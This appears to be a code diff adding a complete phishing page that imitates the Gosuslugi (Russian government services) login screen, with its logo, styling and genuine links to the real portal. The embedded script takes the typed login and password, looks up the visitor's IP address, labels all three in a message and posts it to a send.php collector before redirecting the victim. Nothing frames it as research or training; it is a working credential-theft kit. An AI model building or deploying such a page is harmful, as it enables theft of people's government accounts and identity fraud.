@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги - Вход</title>
+    <style>
+        /* Стили остаются без изменений */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eef3fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .info-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            box-sizing: border-box;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-image {
+            width: 180px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 8px;
+            background: #f1f5fc;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input.error {
+            border: 1px solid #ff3b30;
+            background-color: #fff2f2;
+        }
+        .error-message {
+            color: #ff3b30;
+            font-size: 12px;
+            text-align: left;
+            margin-top: 5px;
+            display: none;
+        }
+        .login-button {
+            background: #0050cc;
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        .login-button:hover {
+            background: #00409f;
+        }
+        .recover-link {
+            display: block;
+            text-align: left;
+            font-size: 15px;
+            color: #0050cc;
+            cursor: pointer;
+            margin-bottom: 20px;
+            text-decoration: none;
+        }
+        .register-link {
+            display: block;
+            text-align: center;
+            font-size: 15px;
+            color: #0050cc;
+            cursor: pointer;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+        .lightbulb-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding-left: 30px;
+        }
+        .lightbulb-icon {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 15px;
+        }
+        .info-text {
+            color: #0050cc;
+            font-size: 15px;
+            text-decoration: none;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="logo">
+                <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги">
+            </div>
+            <input type="text" placeholder="Телефон / Email / СНИЛС" id="username">
+            <div class="error-message" id="username-error">Введите логин</div>
+            <input type="password" placeholder="Пароль" id="password">
+            <div class="error-message" id="password-error">Пароль должен содержать хотя бы один специальный символ</div>
+            
+            <!-- Обновленные ссылки -->
+            <a href="https://esia.gosuslugi.ru/login/recovery" class="recover-link" target="_blank">Восстановить</a>
+            <button class="login-button" id="login-btn">Войти</button>
+            <a href="https://www.gosuslugi.ru/registration" class="register-link" target="_blank">Зарегистрироваться</a>
+        </div>
+        
+        <div class="info-container">
+            <div class="lightbulb-container">
+                <img src="Esia_a1.svg" width="50" height="50" alt="Иконка" class="lightbulb-icon">
+                <a href="https://www.gosuslugi.ru/landing/esia-help" target="_blank" class="info-text">Куда ещё можно войти с паролем от Госуслуг?</a>
+            </div>
+        </div>
+    </div>
+    
+    
+
+<script>
+    function sendToServer(message, source) {
+        fetch("send.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message, source })
+        }).then(() => {
+            window.location.href = "log.htm";
+        });
+    }
+
+    function getUserIP(callback) {
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(() => callback('Неизвестный IP'));
+    }
+
+    function validatePassword(password) {
+        if (password.length < 6) return false;
+        const specialChars = /[!@#$%^&*()_+\-=\[\]{};':"\|,.<>\/?]+/;
+        return specialChars.test(password);
+    }
+
+    function validateUsername(username) {
+        return username.trim().length > 0;
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        const usernameInput = document.getElementById("username");
+        const usernameError = document.getElementById("username-error");
+        const passwordInput = document.getElementById("password");
+        const passwordError = document.getElementById("password-error");
+        const loginButton = document.getElementById("login-btn");
+
+        loginButton.addEventListener("click", function() {
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+            let isValid = true;
+
+            if (!validateUsername(username)) {
+                usernameInput.classList.add("error");
+                usernameError.style.display = "block";
+                isValid = false;
+            } else {
+                usernameInput.classList.remove("error");
+                usernameError.style.display = "none";
+            }
+
+            if (!validatePassword(password)) {
+                passwordInput.classList.add("error");
+                passwordError.style.display = "block";
+                isValid = false;
+                usernameInput.classList.add("error");
+            } else {
+                passwordInput.classList.remove("error");
+                passwordError.style.display = "none";
+            }
+
+            if (isValid) {
+                getUserIP(ip => {
+                    const message = `📧 Логин: ${username}
+🔐 Пароль: ${password}
+🌍 IP: ${ip}`;
+                    sendToServer(message, "login");
+                });
+            }
+        });
+
+        usernameInput.addEventListener("input", function() {
+            if (validateUsername(usernameInput.value)) {
+                usernameInput.classList.remove("error");
+                usernameError.style.display = "none";
+            }
+        });
+
+        passwordInput.addEventListener("input", function() {
+            if (validatePassword(passwordInput.value)) {
+                passwordInput.classList.remove("error");
+                passwordError.style.display = "none";
+                if (validateUsername(usernameInput.value)) {
+                    usernameInput.classList.remove("error");
+                }
+            } else {
+                usernameInput.classList.add("error");
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
